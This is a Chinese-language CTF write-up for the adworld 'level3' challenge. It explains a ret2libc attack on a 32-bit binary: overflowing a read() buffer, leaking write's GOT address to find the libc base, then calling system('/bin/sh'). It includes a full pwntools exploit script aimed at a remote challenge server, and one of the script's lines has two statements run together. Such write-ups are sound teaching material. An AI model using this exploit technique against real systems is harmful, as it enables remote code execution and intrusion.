# level3

题目来源：https://adworld.xctf.org.cn/

这道题是典型的 return to libc 的题目，可惜对这个不是特别熟悉，所以吃了亏，正好借这道题学习一下方法。先简单看一下代码，看代码之前再简单说个小前提，就是下载下来的文件是一个被压缩过的 tar 文件，需要解压缩后获得两个文件，一个是 level3 可执行文件，还有一个是 libc_32.so.6 的动态链接库。

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}

ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  write(1, "Input:\n", 7u);
  return read(0, &buf, 0x100u);
}
```

题目好像和初始的 level0 类似，溢出点也很清晰不需要赘述，但是难点在于程序中没有出现 system 函数，也没有显示出现 /bin/sh 的字符串。理论上使用 ldd，你是能够看到这个文件使用的动态链接库的，就是给出的这个 lib_32.so.6。

因为在程序运行的时候，这个动态链接库也被加载到了内存中，所以我们同样能够使用该库中的数据与函数。通过 strings 可以从库中找到 /bin/sh 的地址为 0x0015902b。但是接下去还缺少一个 system 函数，这个有点难找，当然可以选择使用 ida 去查找，但是使用 pwntools 就能够轻松获取：

> pwntools 中提供类 ELF 来构造一个 elf 文件的结构，只需要通过调用一下方法：
>
> elf.plt: 某个符号在 plt 表中的地址
>
> elf.got: 某个符号在 got 表中的地址
>
> elf.symbols: 某个符号数据或者代码的地址

那么 return to libc 到底如何操作。主要我们发现动态链接库是没有加载地址的，因为只有在动态链接库加载到内存时才能确定最终的地址，而上面查到的 /bin/sh 和 system 的地址都是它们在库文件中的偏移。**所以 return to libc 的灵魂在于如何暴露出 libc 的基地址！**

那么问题就是如何暴露 libc 的基地址呢？因为我们使用到的 write 和 read 函数都是出自 libc，而它们的 got 表中的值最后就是它们在内存中的 libc 内的地址，所以就有了一个公式。假设当前进程中 write 的 got 表项的值是 A，而 write 函数在 libc 库文件的偏移是 B，而一个函数在库文件中的偏移是不会改变的，所以 libc 在内存中的基地址是 A-B。

当我们获取了基地址，就可以构造内存中 libc 中的任何函数的地址了。看一下最终的脚本代码：

```python
from pwn import *                                                         
import time                                                                                                                                                            
conn = remote('220.249.52.133', 54069)                                  
dir_path = '/mnt/c/Users/lenovo/Desktop/4005b2fef2a24a89963f0bfdcac9d0f3/'  
cfile = ELF(dir_path + 'level3')                                            
lib = ELF(dir_path + 'libc_32.so.6')                                                                                                                                  
write_plt = cfile.plt['write']                                    
write_got = cfile.got['write']                                        
main_addr = cfile.symbols['main']                                
# print write_plt                                                          
# print write_got                                                         
# print main_addr                                                         
str1 = 'a' * 0x8C + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0xdeadbeef)           
print conn.recvuntil('Input:')                               
conn.sendline(str1)                                                   
conn.recv()                                                            
rec_str = conn.recv()                                            
write_got_real = u32(rec_str[:4])                                      
print write_got_real                                              
lib_base = write_got_real - lib.symbols['write']            
system_symbol = lib.symbols['system']                          
bin_addr = 0x0015902b                   
str2 = 'a' * 0x8C + p32(lib_base + system_symbol) + p32(1) + p32(lib_base + bin_addr)   print conn.recvuntil('Input:')                                    
conn.sendline(str2)      
conn.interactive()
```

看一下构造 str1 和 str2 的过程，其实一开始一个奇怪的点在于，比如说 str2，在 system 函数地址和 bin 参数中间要加入一个 32 位常数。一开始对这一步很不解，但是仔细想一下栈帧，会发现其实这个常数对应的是返回地址！(可以仔细思考返回后弹出 RIP 之后的栈帧情况，这个区别于直接使用 call system 去构造，它会默认帮我们 push 返回地址)